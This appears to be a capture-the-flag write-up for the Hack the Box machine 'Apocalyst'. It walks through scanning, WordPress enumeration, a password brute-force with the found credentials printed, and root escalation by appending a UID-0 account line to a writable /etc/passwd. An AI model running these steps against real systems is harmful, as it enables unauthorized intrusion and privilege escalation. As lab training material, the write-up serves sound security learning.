# Hack the Box - Apocalyst

```CSS
Machine IP: 10.10.10.46
```

## NMAP
```CSS
▶ nmap -Pn -sS -p- 10.10.10.46 -T4 --min-rate 1000 -oN surface.nmap

Nmap scan report for 10.10.10.46
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
```CSS
▶ nmap -sV -sC -p 22,80 10.10.10.46 -oN deep.nmap

Nmap scan report for 10.10.10.46
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fdab0fc922d5f48f7a0a2911b404dac9 (RSA)
|   256 7692390a57bdf0032678c7db1a66a5bc (ECDSA)
|_  256 1212cff17fbe431fd5e66d908425c8bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apocalypse Preparation Blog
|_http-generator: WordPress 4.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.18 seconds
```

---

## HTTP
![image](https://user-images.githubusercontent.com/83878909/234799547-1b6562ae-e097-4a3a-9754-2e248dd220c4.png)

```CSS
echo "10.10.10.46 apocalyst.htb" >> /etc/hosts
```

![image](https://user-images.githubusercontent.com/83878909/234800289-380fc0b7-bc5b-4345-85f8-9bccb4587432.png)

![image](https://user-images.githubusercontent.com/83878909/234801910-0504a32c-a82c-42f7-9d3a-6bf60cd08204.png)

---

## WordPress
  - WPScan
```CSS
▶ wpscan --url http://apocalyst.htb --enumerate vt,tt,u,ap
```
![image](https://user-images.githubusercontent.com/83878909/234813681-91b0486b-2fd0-4c1b-91db-1cbc0e6aa921.png)
  - Username found, no other useful information was given by wpscan.
```CSS
▶ Username: falaraki
```

---

## Content Discovery
  - Gobuster
```CSS
▶ gobuster dir -u http://apocalyst.htb -w /seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash --threads 50 --exclude-length 157
```
![image](https://user-images.githubusercontent.com/83878909/234814248-b2ce6fa6-335f-47f0-9150-4a97ce13774e.png)


### Custom Wordlist
```CSS
▶ cewl http://apocalyst.htb -w apocalyst.lst
```

### Content Discovery - Custom Worlist
  - Gobuster
```CSS
▶ gobuster dir -u http://apocalyst.htb -w apocalyst.lst --add-slash --threads 50 --exclude-length 157
```
![image](https://user-images.githubusercontent.com/83878909/234815066-2eb4c565-5800-44b4-9843-a0f45ac84797.png)
![image](https://user-images.githubusercontent.com/83878909/234815258-c8eff383-2cde-41c5-84fb-304e757ca0bf.png)

---

## Stegnography
  - Extract data from the image.
```CSS
▶ steghide extract -sf image.jpg
```
  - Wordlist
![image](https://user-images.githubusercontent.com/83878909/234817333-503e3c8e-a882-48f7-9560-74d930d56867.png)

---

## WordPress Credentials Brute-Force
  - WPScan to brute-force user `falaraki`'s password.
```CSS
▶ wpscan --url http://apocalyst.htb --passwords list.txt --usernames falaraki
```
![image](https://user-images.githubusercontent.com/83878909/234819624-ea7096ae-0f37-4a32-bace-63ff7bfb7b91.png)
```CSS
Credentials: falaraki:Transclisiation
```

---

## WordPress Command Injection
  - Login to Wordpress.
![image](https://user-images.githubusercontent.com/83878909/234836050-ea4e4edf-7f91-43d5-b761-fdd6f0d2376b.png)

![image](https://user-images.githubusercontent.com/83878909/234836839-e3e1e0c4-d800-4e97-bf9b-e2a6343295c1.png)
![image](https://user-images.githubusercontent.com/83878909/234837446-329b574b-932d-4681-84f2-4bb6e3236f31.png)

---

## Initial Foothold
![image](https://user-images.githubusercontent.com/83878909/234841446-6dc35a83-0d2a-48e8-9254-fcd15073189b.png)
![image](https://user-images.githubusercontent.com/83878909/234841296-52b80dfc-6a73-4a0b-8045-ceba14e57f5e.png)

## Privilege Escalation
  - Upload and Execute `LinEnum.sh`.
![image](https://user-images.githubusercontent.com/83878909/234843155-1849834f-3d3b-4046-ad86-57966717173c.png)

  - Writeable `/etc/passwd` file.
![image](https://user-images.githubusercontent.com/83878909/234844540-b33dfab0-c742-414c-8e67-e470a551fd84.png)

  - Generate Password
```CSS
▶ openssl passwd -1 -salt random passwd123
$1$random$UuecLMKsRjAA/tqoL9SKL.
```
![image](https://user-images.githubusercontent.com/83878909/234854606-78438923-1830-4c04-9d3f-56fad5e1c9f8.png)
![image](https://user-images.githubusercontent.com/83878909/234857915-f2626cb8-6892-4cc5-b96a-a0d40cb62e5c.png)

  - Add the below line to `/etc/passwd`
```CSS
random:$1$random$UuecLMKsRjAA/tqoL9SKL.:0:0:root:/bin/bash
```
  - Switch User as Root
```
▶ su random
```
![image](https://user-images.githubusercontent.com/83878909/234858785-9d3286e7-8f0b-45db-b7f4-3092e65afc81.png)

---
